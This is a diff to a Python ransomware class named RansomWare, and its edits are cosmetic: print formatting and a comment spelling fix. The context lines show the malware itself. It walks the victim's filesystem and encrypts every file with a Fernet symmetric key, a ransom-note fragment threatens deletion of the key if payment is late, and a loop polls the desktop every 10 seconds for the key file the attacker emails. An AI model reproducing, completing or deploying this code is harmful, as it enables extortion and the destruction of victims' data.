@@ -96,7 +96,7 @@ class RansomWare:
 
     # [SYMMETRIC KEY] Fernet encrypt/decrypt system files using the symmetric key that was generated on victims machine.
     def crypt_system(self, encrypted=False):
-        print(f"Start time: {datetime.datetime.now()}")
+        print(f"\nStart time: {datetime.datetime.now()}")
         system = os.walk(self.localRoot, topdown=True)
         for root, dir, files in system:
             for file in files:
@@ -107,7 +107,7 @@ class RansomWare:
                     self.crypt_file(file_path)
                 else:
                     self.crypt_file(file_path, encrypted=True)
-        print(f"End time: {datetime.datetime.now()}")
+        print(f"\nEnd time: {datetime.datetime.now()}")
 
     @staticmethod
     def what_is_bitcion():
@@ -177,7 +177,7 @@ If the payment is not made on time, the decryption key will be deleted and you w
             try:
                 # The ATTACKER decrypts the Fernet symmetric key on their machine and then puts the un-encrypted Fernet-
                 # -key in this file and sends it in a email to the victim. They then put this on the desktop and it will be-
-                # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASSYEMTRIC KEY.
+                # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASYMMETRIC KEY.
                 with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                     self.key = f.read()
                     self.crypter = Fernet(self.key)
@@ -186,7 +186,7 @@ If the payment is not made on time, the decryption key will be deleted and you w
                     print('[!] Target machine has been un-encrypted.')  # DEBUG
                     break
             except Exception as e:
-                print(e, end="\r", flush=True)  # DEBUG
+                print(f'{e}\r', end="")  # DEBUG
                 pass
             # Scan the desktop for the file every 10 seconds.
             time.sleep(10)  # DEBUG
